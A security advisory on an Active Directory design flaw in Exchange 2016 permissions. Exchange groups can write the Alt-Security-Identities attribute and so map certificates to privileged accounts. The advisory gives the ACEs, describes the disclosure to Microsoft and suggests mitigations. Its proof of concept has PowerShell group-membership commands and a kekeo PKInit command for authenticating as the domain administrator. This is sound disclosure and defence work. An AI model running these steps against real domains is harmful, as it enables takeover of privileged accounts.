## Public-Information property set includes Alt-Security-Identities, allows x509 certificate mapping to privileged users

An attack vector exists from the **Exchange Enterprise Servers** 
and from the **Exchange Trusted Subsystem** security groups to authenticate as any domain account through PKInit using X509 certificates. Basically, misconfigured permissions allow mapping certificates to privileged accounts.

This issue has been responsibly disclosed to MSRC and received a "won't fix" response. The justification is that Exchange deployments should be done in Split Permissions mode otherwise privileges escalation to Domain Admins is to be expected. However, risk assessment would justify the production of a fix:

  * Most MS Exchange deployments are not Split but RBAC, putting MS customers at risk of AD compromise ;
  * A lot of efforts have already been done to prevent Exchange to AD privileges escalations, some of which you can read in this very repository ;
  * A previous vulnerability of the same type got the fix I suggested when infosec bloggers published some AD compromission chains including it ;
  * The fix is quick and low-impact.

[See the June 2019 quarterly updates.](https://techcommunity.microsoft.com/t5/Exchange-Team-Blog/Released-June-2019-Quarterly-Exchange-Updates/ba-p/698398)

* Description of the issue

In up-to-date deployments of Exchange 2016 in Shared permissions (default) or RBAC model, ACEs allowing to write the Alt-Security-Identities property through the Public-Information property set are positioned on the Domain Object and on the AdminSDHolder object for the **Exchange Trusted Subsystem** security group 
and for the **Exchange Enterprise Servers** security groups. [Those ACEs are partially documented](https://docs.microsoft.com/en-us/exchange/exchange-2013-deployment-permissions-reference-exchange-2013-help).

The Public-Information property set is intended for non-sensitive attributes such as department, phone number etc. However, it also contains Alt-Security-Identities which is a Kerberos-related attribute. ACEs allowing to write this property allow adding [X509 certificates mapped to the target user object](https://blogs.msdn.microsoft.com/spatdsg/2010/06/18/howto-map-a-user-to-a-certificate-via-all-the-methods-available-in-the-altsecurityidentities-attribute/). If smartcard logon is used in the Active Directory domain and more generally if the NTAuth container has Certificate Authorities, anyone controlling any certificate signed by one of the NTAuth CAs can map it to any user, even privileged ones such as Domain Admins members.


All in all, it is a design problem. The Public-Information property set should only contain non-sensitive attributes and especially not security data like X509 certificates-users mappings. 


```
(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;<SID of EES>)
(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;<SID of ETS>)
```

Which translate into:

| Account | ACE type | Inheritance | Permissions | On property/ Applies to | Comments |
| ------- | -------- | ----------- | ----------- | ----------------------- | -------- |
| Exchange Enterprise Servers | Allow ACE | All | WriteProp | Public-Information / | |
| Exchange Trusted Subsystem | Allow ACE | All | WriteProp | Public-Information/ | |


* Technical consequence

Any member of Exchange Trusted Subsystem or Exchange Enterprise Servers can add a X509 certificate mapping to any account in the domain and use it to authenticate. 

* Security Consequence

Setting X509 certificates mappings on unexpected privileged user accounts allows authentication through PKInit to those accounts.

* Proof of concept

1) From an Organization Management member account, add yourself to Exchange Trusted Subsystem.
This is possible by default and normal.

```
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members $user
```

2) LOG OUT AND RELOG THE USERS SESSION to update groups in token

3) Add a certificate mapping to a victim target account for an attacker-controlled certificate (possessing the private key), signed by a CA present in the NTAuth container.
(Usual situation when using smartcard logon in the domain).
This is the problem, it should not be allowed.

Edit the Alt-Security-Identities attribute of the target account "administrator" with DSA.msc and set the UPN of your account:

```
testuser@lab.local
```

4) Use PKInit to authenticate with the target account, for example using the "kekeo" tool, having the certificate available in the current user store (smartcard being inserted, etc.):

kekeo # tgt::ask /caname:"Lab Root CA" /castore:current_user /upn:testuser@lab.local /user:administrator@lab.local



* Workaround fix

A crude but safe way of mitigating this problem is denying Everyone from writing the Alt-Security-Identities of your sensitive accounts, beginning with the AdminSDHolder DACL.

It can be done manually with LDP: bind as a Domain Admin account with the usual precautions, as you will change the AdminSDHolder DACL.

Backup the DACL: 

```
(Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=...").Sddl | Out-File "adminsdholder_dacl.txt"
```

Locate the "CN=AdminSDHolder,CN=System,DC=..." object, right-click "Security Descriptor", untick "Text Dump". Add... Select Trustee: "Everyone", Type: "Deny", Access Mask: "Write Property", ACE Flags: "Inherit", Object Type:  "altSecurityIdentities - attribute", Inherited Object Type: "None".

If you need to revert this change, you can simply delete this new ACE.


Another way of solving this issue is modifying the schema (not recommended). If you still feel comfortable doing it (Lab work...), you have to clean the Rights-Guid Attribute in the Alt-Security-Identities schema object. Its default value is e48d0154-bcf8-11d1-8702-00c04fb96050 (Public-Information property set), just remove that. 

